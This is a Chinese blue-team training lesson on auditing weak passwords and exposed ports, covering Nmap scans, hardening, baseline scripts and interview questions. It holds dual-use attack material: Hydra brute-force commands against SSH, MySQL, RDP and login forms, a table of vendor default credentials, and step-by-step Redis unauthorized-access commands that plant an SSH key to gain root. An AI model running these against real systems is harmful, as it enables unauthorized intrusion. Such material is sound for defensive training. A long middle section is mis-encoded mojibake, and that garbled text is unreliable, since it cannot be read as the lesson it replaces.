---
day: 37
title: 弱口令与端口暴露风险排查实操
phase: 第一阶段 · 初级蓝队夯实
difficulty: ⭐⭐⭐ 中等
---

# Day 37：弱口令与端口暴露风险排查实操

> **阶段**：第一阶段 · 初级蓝队夯实 | **难度**：⭐⭐⭐ 中等 | **课时**：2-3小时

---

## 学习目标

1. 理解弱口令为什么是蓝队最需要关注的基础安全问题
2. 掌握常用的弱口令检测工具（Hydra、Medusa、John the Ripper）
3. 能通过 Nmap 扫描资产暴露的端口和服务
4. 学会编写和使用安全基线检查脚本
5. 能发现并整改常见的弱口令和端口暴露风险
6. 理解纵深防御中身份认证安全的重要性

---


---

## 一、弱口令——黑客最爱的入口

弱口令是网络安全中最古老、最简单、但依然最常见的问题。统计数据显示，
超过 80% 的数据泄露事件与弱口令或口令泄露有关。

什么是弱口令？
- 太短：如 123456、admin、password
- 太简单：如 admin123、company2024
- 默认密码：如 admin/admin、root/toor、sa/sa
- 字典中的单词：如 welcome、summer、football
- 个人信息相关：如生日、姓名拼音、手机号

为什么弱口令这么危险？
因为攻击者不需要高深的技术就能利用——只需要一个密码字典
和一点耐心。即使是最先进的安全系统，如果密码是 123456，
等于把钥匙挂在门口。

蓝队需要关注的弱口令高风险区域：

| 风险区域 | 默认/弱口令示例 | 风险等级 |
|:---|:---|:---|
| SSH 远程登录 | root/root, root/toor | 极高 |
| MySQL 数据库 | root/(空), root/mysql | 极高 |
| Redis 缓存 | (空), foobared | 极高 |
| Tomcat 管理 | tomcat/tomcat, admin/admin | 高 |
| Web 管理后台 | admin/admin, admin/123456 | 高 |
| FTP 文件传输 | anonymous/(空) | 高 |
| SNMP 网络管理 | public, private | 中 |
| Jenkins | admin/password | 高 |


---

## 二、Nmap 端口扫描——摸清暴露面

在查弱口令之前，先要知道哪些端口是开放的。Nmap 是最专业的端口扫描工具。

```bash
# 基础端口扫描（扫描 1000 个常用端口）
nmap 192.168.1.0/24

# 全端口扫描（1-65535）
nmap -p- 192.168.1.10

# 服务版本检测
nmap -sV 192.168.1.10

# 操作系统检测
nmap -O 192.168.1.10

# 综合扫描（端口 + 服务 + 系统 + 脚本）
nmap -A 192.168.1.10

# 输出到文件
nmap -oA scan_result 192.168.1.0/24
# 生成 scan_result.nmap, scan_result.xml, scan_result.gnmap
```

蓝队重点关注的高危端口：
- 22 (SSH) - 远程管理入口
- 3389 (RDP) - Windows 远程桌面
- 3306 (MySQL) - 数据库
- 6379 (Redis) - 缓存，常无密码
- 27017 (MongoDB) - NoSQL 数据库
- 9200/9300 (Elasticsearch) - 搜索引擎
- 21 (FTP) - 文件传输
- 23 (Telnet) - 明文远程登录（极度危险！）
- 8080/8443 (Tomcat/Jenkins) - Web 管理界面


---

## 三、Hydra 弱口令检测实战

Hydra（九头蛇）是最流行的在线密码破解工具，蓝队用它来检测系统是否存在弱口令。

```bash
# SSH 弱口令检测
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# 多个用户 + 密码字典
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# MySQL 弱口令检测
hydra -l root -P passwords.txt mysql://192.168.1.10

# FTP 弱口令检测
hydra -l admin -P passwords.txt ftp://192.168.1.10

# HTTP 登录表单
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed"

# RDP 远程桌面
hydra -l administrator -P passwords.txt rdp://192.168.1.10
```

参数说明：
- -l：指定用户名
- -L：用户名字典文件
- -p：指定密码
- -P：密码字典文件
- -t：并发线程数（默认 16）
- -vV：详细输出

蓝队使用 Hydra 的道德边界：
- 只在授权范围内使用！
- 先在测试环境练习
- 对生产系统检测前必须获得书面授权
- 检测时间选择业务低峰期
- 检测后立即报告结果并协助修复


---

## 四、密码策略加固方案

发现弱口令后，需要从制度和工具两个层面加固：

制度层面：
1. 密码长度要求：至少 12 位
2. 复杂度要求：大小写字母 + 数字 + 特殊字符，至少 3 种
3. 更换周期：90 天强制更换
4. 历史记录：不能使用最近 5 次用过的密码
5. 锁定策略：连续 5 次失败锁定 30 分钟
6. 首次登录：强制修改默认密码

工具层面：
| 工具 | 用途 | 平台 |
|:---|:---|:---|
| John the Ripper | 离线密码破解/强度检测 | 全平台 |
| Hashcat | 最快的密码破解工具 | 全平台 |
| pam_cracklib | Linux 密码强度检查 | Linux |
| LAPS | Windows 本地管理员密码管理 | Windows |
| 堡垒机/JumpServer | 统一认证 + 审计 | 全平台 |

最佳实践：用密码管理器（如 Bitwarden）为每个系统生成随机长密码，
而不是让人来想密码。


---

## 五、端口暴露风险排查清单

蓝队标准端口排查流程：

Step 1：资产端口扫描
```bash
# 对所有内网 IP 做全端口扫描
nmap -p- -T4 192.168.1.0/24 -oA full_scan_$(date +%Y%m%d)
```

Step 2：高危及非必要端口识别
```bash
# 从扫描结果中提取高危服务
grep -E '22/open|3389/open|3306/open|6379/open|27017/open' scan_result.nmap
```

Step 3：确认端口开放的必要性
- 数据库端口（3306/5432/1433/27017）是否对全网开放？
  -> 应该只对应用服务器 IP 开放
- SSH 端口（22）是否对外网开放？
  -> 应该只能从堡垒机访问
- 管理端口（8080/9090/9200）是否需要外网访问？
  -> 应该只能内网访问

Step 4：非必要端口的关闭/限制
```bash
# iptables 示例：只允许特定 IP 访问 MySQL
iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.100 -j ACCEPT
iptables -A INPUT -p tcp --dport 3306 -j DROP
```


---

## 六、自动化安全基线检查脚本

以下脚本可以帮助蓝队自动化基础安全检查：

```bash
#!/bin/bash
# 安全基线快速检查脚本
echo "=== 安全基线检查报告 ==="
echo "主机: $(hostname)"
echo "时间: $(date)"
echo ""

# 1. 检查弱口令用户（空密码）
echo "[1] 空密码账户检查:"
awk -F: '($2 == "") {print $1}' /etc/shadow 2>/dev/null

# 2. 检查开放端口
echo "[2] 监听端口:"
ss -tlnp 2>/dev/null || netstat -tlnp

# 3. 检查 SSH 配置
echo "[3] SSH 安全配置:"
grep -E 'PermitRootLogin|PasswordAuthentication|Port' /etc/ssh/sshd_config

# 4. 检查是否有不需要的服务在运行
echo "[4] 可疑服务检查:"
systemctl list-units --type=service --state=running | grep -E 'telnet|ftp|rsh'

# 5. 检查计划任务
echo "[5] 所有用户的计划任务:"
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null
done

echo ""
echo "=== 检查完成 ==="
```

将此脚本加入日常巡检，每天自动运行一次。


---

## 七、面试高频问答

Q: 你发现公司内网 50 台服务器中有 12 台存在弱口令，你怎么处理？

A: 分四步走：
1. 立即通知：告知这 12 台服务器的负责人弱口令风险，
   要求立即修改密码
2. 风险评估：确认这 12 台服务器的资产重要性，
   是否有对外暴露、是否存有敏感数据
3. 制度加固：推动 IT 部门部署统一的密码策略
   （复杂度+历史+过期+锁定）
4. 长效机制：引入堡垒机（JumpServer）统一管理登录，
   部署定期弱口令扫描（每周一次）

Q: SSH 密钥认证比密码认证安全在哪？

A: SSH 密钥认证使用非对称加密，有三大优势：
1. 难以暴力破解：4096 位的 RSA 密钥的密钥空间远远大于
   任何密码字典
2. 不通过网络传输密码：私钥始终在客户端，网络只传输签名
3. 可以集中管理：公钥部署在服务器上，私钥由用户保管，
   配合 ssh-agent 使用更方便

推荐做法：对内网关键服务器禁用密码登录，只用 SSH 密钥认证。

---

## 实操任务

1. 使用 Nmap 扫描你本地网络，识别所有开放的高危端口
2. 在 DVWA 或本地搭建的 Linux 环境中创建一个弱口令账户
3. 使用 Hydra 对该账户进行弱口令检测
4. 编写并运行安全基线检查脚本
5. 配置 SSH 密钥认证并禁用密码登录
6. 给发现的所有弱口令编写修复建议报告
---

## 验收标准

- [ ] 能使用 Nmap 完成端口扫描并解读扫描结果
- [ ] 能使用 Hydra 进行弱口令检测
- [ ] 能列出至少 10 个常见的高危端口及其对应服务
- [ ] 理解密码策略的基本要求（长度/复杂度/过期/锁定）
- [ ] 能编写一个基础的安全基线检查脚本
- [ ] 能区分在线爆破和离线破解的适用场景
---

## 今日小结

弱口令和端口暴露是最基础但最容易被忽略的安全问题。在攻击者眼中，一个默认密码的 Redis 比一个复杂的零日漏洞更有吸引力——因为它不需要任何技术就能利用。蓝队的基础安全就是从这些小事做起。
## 延伸阅读

1. NIST SP 800-63B 数字身份指南中的密码策略建议
2. 搜索 OWASP Authentication Cheat Sheet
---

> **明日预告**：Day 38 — DVWA靶场通关（蓝队视角）。动手实践！

---

## 补充：弱口令深度排查与进阶

### 常见服务的默认密码大全（蓝队排查清单）

蓝队必须知道的常见服务默认密码：

| 服务 | 默认用户名 | 默认密码 | 影响 |
|:---|:---|:---|:---|
| MySQL | root | (空密码) | 数据库被完全控制 |
| PostgreSQL | postgres | postgres | 同上 |
| MongoDB | (无认证) | (无认证) | 数据可被任意访问 |
| Redis | (无认证) | (无认证) | 可写入 SSH key 拿服务器权限 |
| Elasticsearch | elastic | changeme | 集群被控制 |
| Tomcat | admin/tomcat | admin/tomcat | 可部署 WAR 包拿 Webshell |
| Jenkins | admin | password | 可执行任意命令 |
| Oracle WebLogic | weblogic | welcome1 | 可部署应用 |
| phpMyAdmin | root | (空) | 直接操作数据库 |
| RabbitMQ | guest | guest | 消息队列被控制 |
| FTP | anonymous | (空) | 匿名文件访问 |
| SNMP | public/private | (无需密码) | 网络信息泄露 |
| Cisco 设备 | admin/cisco | admin/cisco | 网络设备被控制 |
| 海康威视摄像头 | admin | 12345 | 监控视频泄露 |

### Redis 未授权访问的危害（重点）

Redis 默认不需要密码认证，如果暴露在公网上，攻击者可以通过写入 SSH 公钥直接拿到服务器权限：

```bash
# 攻击者视角（蓝队需要理解攻击手法才能防御）
# 1. 连接无密码的 Redis
redis-cli -h target_ip

# 2. 写入 SSH 公钥到 Redis 数据库
config set dir /root/.ssh/
config set dbfilename authorized_keys
set xx "\n\nssh-rsa AAAAB3NzaC1yc2...\n\n"
save

# 3. 攻击者现在可以用私钥 SSH 登录为目标服务器 root 用户
ssh root@target_ip
```

蓝队防御 Redis 的措施：
1. 绑定本地 IP：bind 127.0.0.1（只允许本地访问）
2. 设置复杂密码：requirepass 随机长密码
3. 改名危险命令：rename-command CONFIG ""（禁用 CONFIG）
4. 最小权限运行：不以 root 用户启动 Redis
5. 防火墙限制：只允许应用服务器 IP 访问 6379

### 密码策略的最佳实践演变

传统密码策略（已过时）：
- 8 位密码 -> 太短，可暴力破解
- 每 90 天强制更换 -> 用户会在末尾加数字（Password1 -> Password2）
- 必须包含特殊字符 -> 用户会统一在末尾加 !

现代密码策略（NIST SP 800-63B 推荐）：
- 最少 8 位，推荐 12 位以上
- 不强制复杂度要求（长度比复杂度更重要）
- 不强制定期更换（除非有泄露迹象）
- 检查密码是否出现在已知泄露密码库中
- 提供密码管理器，鼓励使用自动生成的随机密码
- 强制开启 MFA（多因素认证）作为最重要的一道防线

记住：一个 16 位的纯小写字母密码比 8 位的大小写+数字+符号密码更安全，
因为密码长度对安全性的提升是指数级的，而复杂度只是线性提升。

---

## 钃濋槦绔彛瀹夊叏鎺掓煡鏍囧噯鍖栨墜鍐孿n
### 绔彛鏆撮湶鐨勪笁绾у垎绫籠n
涓€绾х鍙ｏ紙蹇呴』瀵瑰锛夛細80(HTTP)銆?43(HTTPS)
  -> 杩欎簺鏄笟鍔＄鍙ｏ紝蹇呴』寮€鏀綷n  -> 闃叉姢锛氬墠闈㈡斁 WAF/CDN锛岄檺鍒剁洿鎺ヨ闂簮绔橽n
浜岀骇绔彛锛堟寜闇€瀵瑰唴锛夛細22(SSH)銆?306(MySQL)銆?379(Redis)
  -> 绠＄悊绔彛鍜屾暟鎹鍙ｏ紝鍙鍐呯綉寮€鏀綷n  -> 闃叉姢锛氱粦瀹氬唴缃?IP + 璁块棶鎺у埗鍒楄〃

涓夌骇绔彛锛堜弗鏍肩姝級锛?3(Telnet)銆?1(FTP鏄庢枃)銆?35-139(NetBIOS)
  -> 楂樺嵄/杩囨椂绔彛锛屽繀椤诲叧闂璡n  -> 鏇夸唬鏂规锛氱敤 SSH 浠ｆ浛 Telnet銆佺敤 SFTP 浠ｆ浛 FTP

### 绔彛鏆撮湶鐨勫彂鐜颁笌澶勭疆娴佺▼

Step 1锛氭瘡鍛ㄥ鍐呯綉鍋氫竴娆″叏绔彛鎵弿
Step 2锛氬姣斿墠涓€鍛ㄧ殑鎵弿缁撴灉锛屽彂鐜版柊澧炵殑寮€鏀剧鍙nStep 3锛氳瘎浼版瘡涓柊绔彛鐨勫繀瑕佹€у拰椋庨櫓
Step 4锛氶潪蹇呰绔彛 -> 绔嬪嵆鍏抽棴/闄愬埗
Step 5锛氭柊澧炵鍙?-> 鏇存柊璧勪骇鍙拌处鍜屽畨鍏ㄨ鍒橽n
### Windows 绯荤粺绔彛瀹夊叏鐗瑰埆娉ㄦ剰浜嬮」

Windows 榛樿寮€鏀句簡寰堝楂樺嵄绔彛锛圢etBIOS 135-139銆丼MB 445銆丷DP 3389锛塡n- 3389(RDP)锛氫笉搴斿澶栫綉寮€鏀撅紒濡傛灉蹇呴』杩滅▼锛岀敤 VPN 鎴栧牎鍨掓満
- 445(SMB)锛氭案鎭掍箣钃?EternalBlue)灏辨槸鎵撹繖涓鍙?-> 绂佹澶栫綉璁块棶
- 135-139(NetBIOS)锛氫俊鎭硠闇茬鍙?-> 鍐呯綉涔熷簲鍏抽棴锛堢敤 DNS 浠ｆ浛锛塡n
鍏抽棴 Windows 楂樺嵄绔彛鐨勫懡浠わ細
`powershell
# 绂佺敤 SMBv1锛堟案鎭掍箣钃濆埄鐢ㄧ殑婕忔礊锛塡nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
# 鍏抽棴 NetBIOS over TCP/IP
# 缃戠粶閫傞厤鍣?-> 灞炴€?-> IPv4 -> 楂樼骇 -> WINS -> 绂佺敤 NetBIOS
`

---

## 寮卞彛浠ゅ缃殑瀹屾暣宸ュ叿閾綷n
| 闃舵 | 宸ュ叿 | 鍛戒护绀轰緥 | 杈撳嚭 ||:---|:---|:---|:---|| 鍙戠幇绔彛 | Nmap | nmap -p- target | 寮€鏀剧鍙ｅ垪琛?|| 璇嗗埆鏈嶅姟 | Nmap -sV | nmap -sV -p 22,3306 target | 鏈嶅姟鐗堟湰 || 寮卞彛浠ゆ娴?| Hydra | hydra -l root -P dict.txt ssh://target | 寮卞瘑鐮佽处鎴?|| 瀵嗙爜寮哄害 | John | john -test | 瀵嗙爜寮哄害璇勪及 || 鍚堣妫€鏌?| 鑷畾涔夎剼鏈?| bash check_baseline.sh | 鍚堣鎶ュ憡 || 淇璺熻釜 | 宸ュ崟绯荤粺 | Jira/Wiki | 淇璁板綍 |

---

## 蓝队弱口令排查实战脚本

### Linux 批量弱口令检测脚本

```bash
#!/bin/bash
# 批量检测 Linux 系统弱口令
# 1. 检查空密码账户
echo '=== 空密码账户 ==='
awk -F: '($2==""||$2=="!"){print $1}' /etc/shadow

# 2. 检查 root 是否允许远程登录
grep '^PermitRootLogin' /etc/ssh/sshd_config

# 3. 检查密码过期策略
grep -E '^PASS_MAX_DAYS|^PASS_MIN_DAYS|^PASS_WARN_AGE' /etc/login.defs

# 4. 检查 sudo 权限
grep -v '^#' /etc/sudoers | grep -v '^$'
```

### Windows 弱口令排查

```powershell
# 检查密码策略
net accounts

# 检查本地管理员组成员
net localgroup administrators

# 检查 Guest 账户状态
net user guest

# 查看最近登录的用户
Get-WinEvent -LogName Security -MaxEvents 50 | Where-Object {$_.Id -eq 4624}
```

---

## 蓝队端口与弱口令安全建设路线图

### 短期（本周完成）
- 完成全量资产端口扫描
- 关闭所有非必要的对外开放端口（Telnet/FTP/SMB外网等）
- 修改所有默认密码和弱口令
- 启用 SSH 密钥认证，禁用密码登录

### 中期（本月完成）
- 部署堡垒机统一管理所有服务器的登录
- 建立密码复杂度策略（12位+不强制定期更换+检查泄露密码库）
- 开启多因素认证（MFA）
- 建立端口变更审批流程

### 长期（持续建设）
- 建立资产发现 + 端口扫描 + 弱口令检测的自动化流水线
- 将扫描结果与 CMDB 对接，实现资产安全状态可视化
- 建立零信任架构，消除基于网络位置的信任假设
- 定期（每季度）进行内部红蓝对抗，检验端口和口令安全

---

## 知识串联

Day 36（ELK）和 Day 37（弱口令/端口）的关系：
- ELK 收集所有登录日志 -> 在 Kibana 中分析异常登录
- Nmap 扫描开放的 SSH/RDP 端口 -> ELK 监控这些端口的登录行为
- 发现弱口令（Hydra 扫描）-> 修复 -> ELK 验证异常登录是否减少
- ELK + Nmap + Hydra = 完整的身份认证安全监控链

记住：安全不是一个工具、一个操作就能搞定的。
把各个工具串联起来，形成闭环的流程和制度，才是真正的蓝队安全建设。

---

## 端口安全与弱口令排查速查表

### 蓝队端口排查优先级

| 优先级 | 端口 | 风险 | 动作 |
|:---|:---|:---|:---|
| P0 | 445(SMB) | 永恒之蓝入口 | 立即关闭外网访问 |
| P0 | 3389(RDP) | 暴力破解热点 | 改端口/VPN/堡垒机 |
| P1 | 22(SSH) | 弱口令爆破 | 密钥登录+防爆破 |
| P1 | 3306/6379 | 数据泄露 | 绑定内网IP |
| P2 | 21/23 | 明文协议 | 改用SFTP/SSH |

### 弱口令排查流程

发现端口开放 -> 识别服务版本 -> 用Hydra弱口令测试 -> 发现问题立即通知整改 -> 每周复查一次

### 一句话口诀

"端口不对外，密码不简单，服务不默认" ——蓝队端口安全的九字真经。

### 弱口令检测工具实战对比

| 工具 | 协议覆盖 | 速度 | 特点 |
|:---|:---|:---|:---|
| Hydra | SSH/FTP/MySQL/RDP/HTTP等 | 快 | 最通用的弱口令检测工具 |
| Medusa | 多协议并行 | 快 | 支持并行爆破 |
| Ncrack | SSH/RDP/FTP/HTTP等 | 较快 | Nmap团队出品 |
| John the Ripper | 离线密码破解 | 极快 | 本地密码哈希破解 |

### 企业弱口令整改方案

1. 技术层面：密码复杂度策略（12位+大小写+特殊字符）
2. 管理层面：定期密码更换制度（90天）
3. 监控层面：登录失败告警（5次错误即告警）
4. 审计层面：每月弱口令扫描并通报

> 明日预告：Day 38 — DVWA靶场通关（蓝队视角），在真实环境中理解漏洞的检测与防御。
